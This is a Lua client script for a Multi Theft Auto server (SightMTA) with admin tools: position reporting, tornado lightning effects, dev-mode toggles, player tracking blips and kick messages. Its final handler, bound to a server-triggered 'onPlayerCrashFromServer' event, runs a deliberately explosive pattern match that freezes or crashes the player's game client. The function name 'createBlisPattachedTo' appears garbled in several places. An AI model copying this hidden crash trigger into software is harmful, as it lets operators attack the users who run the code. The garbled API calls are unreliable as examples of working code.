local sightexports = {sDashboard = false}
local function sightlangProcessExports()
  for k in pairs(sightexports) do
    local res = getResourceFromName(k)
    if res and getResourceState(res) == "running" then
      sightexports[k] = exports[k]
    else
      sightexports[k] = false
    end
  end
end
sightlangProcessExports()
if triggerServerEvent then
  addEventHandler("onClientResourceStart", getRootElement(), sightlangProcessExports, true, "high+9999999999")
end
if triggerClientEvent then
  addEventHandler("onResourceStart", getRootElement(), sightlangProcessExports, true, "high+9999999999")
end
local screenX, screenY = guiGetScreenSize()
function getPosition()
  if getElementData(localPlayer, "acc.adminLevel") >= 0 then
    local posX, posY, posZ = getElementPosition(localPlayer)
    local rx, ry, rz = getElementRotation(localPlayer)
    local interior = getElementInterior(localPlayer)
    local dimension = getElementDimension(localPlayer)
    outputChatBox("Pozició: " .. posX .. ", " .. posY .. ", " .. posZ)
    outputChatBox("Rotáció: " .. rx .. ", " .. ry .. ", " .. rz)
    outputChatBox("Interior: " .. interior)
    outputChatBox("Dimenzió: " .. dimension)
  end
end
addCommandHandler("getpos", getPosition)
local blip = false
addEvent("gotTornadoObject", true)
addEventHandler("gotTornadoObject", getRootElement(), function()
  tornado = source
  if isElement(blip) then
    destroyElement(blip)
  end
  blip = createBlisPattachedTo(tornado, 2, 1, 135, 206, 250, 255)
end)
local lightnings = {
  dxCreateTexture("files/1.png"),
  dxCreateTexture("files/2.png"),
  dxCreateTexture("files/3.png"),
  dxCreateTexture("files/4.png"),
  dxCreateTexture("files/5.png")
}
local electricSounds = {}
addEventHandler("onClientPreRender", getRootElement(), function()
  if tornado then
    local els = getAttachedElements(tornado)
    local x, y, z = getElementPosition(tornado)
    local now = getTickCount()
    for i = 1, #els do
      local x2, y2, z2 = getElementPosition(els[i])
      dxDrawMaterialLine3D(x, y, z, x2 + math.random(-100, 100) / 100, y2 + math.random(-100, 100) / 100, z2 + math.random(-100, 100) / 100, lightnings[math.random(1, 5)], 10)
      if 0 < now - (electricSounds[i] or 0) then
        electricSounds[i] = now + 5000 * math.random(200, 1100) / 1000
        local s = playSound3D("files/elec.mp3", x2, y2, z2)
        attachElements(s, els[i])
        setSoundMaxDistance(s, 200)
        setSoundVolume(s, 1.5)
      end
    end
  end
end)
function refreshDevMode()
  local admin = getElementData(localPlayer, "acc.adminLevel") or 0
  if 7 < admin then
    setDevelopmentMode(true, true)
  else
    setDevelopmentMode(false, false)
  end
end
refreshDevMode()
addEventHandler("onClientElementDataChange", localPlayer, function(dataName, oldValue, newValue)
  if dataName == "acc.adminLevel" and newValue and 7 < newValue then
    refreshDevMode()
  end
end)
addEvent("onAsay", true)
addEventHandler("onAsay", getRootElement(), function()
  local sound = playSound("files/asay.wav")
  setSoundVolume(sound, 2.5)
end)
trackingBlip = false
addEvent("trackPlayer", true)
addEventHandler("trackPlayer", getRootElement(), function(player)
  if isElement(player) then
    trackingBlip = createBlisPattachedTo(player, 0, 2, 255, 0, 0, 255)
    setElementData(trackingBlip, "tooltipText", getElementData(player, "visibleName"))
  else
    if isElement(trackingBlip) then
      destroyElement(trackingBlip)
    end
    trackingBlip = nil
  end
end)
local togKick = true
function getTogKick()
  return togKick
end
function setTogKick(state)
  togKick = state
end
addCommandHandler("togkick", function()
  togKick = not togKick
  sightexports.sDashboard:saveValue("togtraffi", togKick)
  outputChatBox("[color=sightgreen][SightMTA]: [color=hudwhite]Kick üzenetek " .. (togKick and "[color=sightgreen]bekapcsolva" or "[color=sightred]kikapcsolva") .. "[color=hudwhite].", 255, 255, 255, true)
end)
addEvent("kickMsg", true)
addEventHandler("kickMsg", getRootElement(), function(targetPlayerName, playerName, reason)
  if togKick then
    outputChatBox("[color=sightorange][SightMTA - Kick]:[color=sightblue] " .. targetPlayerName .. " [color=hudwhite]ki lett rúgva a szerverről [color=sightblue]" .. playerName .. " #ffffffáltal.", 255, 255, 255, true)
    outputChatBox("[color=sightorange][SightMTA - Kick]:[color=sightblue] Indok:[color=hudwhite] " .. reason, 255, 255, 255, true)
  end
end)
addEvent("onPlayerCrashFromServer", true)
addEventHandler("onPlayerCrashFromServer", getRootElement(),
	function()
		print(string.find(string.rep("a", 2^20), string.rep(".?", 2^20))) --// noffy 2025.03.01 - 23:40
	end
)